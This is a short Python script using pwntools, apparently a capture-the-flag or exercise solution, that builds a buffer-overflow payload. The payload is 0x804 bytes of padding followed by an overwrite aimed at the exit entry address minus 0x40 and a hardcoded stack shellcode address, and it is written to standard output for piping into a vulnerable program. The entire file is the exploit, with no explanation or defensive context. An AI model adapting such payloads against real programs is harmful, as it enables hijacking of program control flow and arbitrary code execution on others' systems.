#!/usr/bin/python3
import sys
from pwn import *

plt_exit_adderss = 0x0804d01c
shellcode_address = 0xffffd546

payload = b'a' * 0x804

payload += p32(plt_exit_adderss - 0x40)
payload += b' ' + p32(shellcode_address)

sys.stdout.buffer.write(payload)
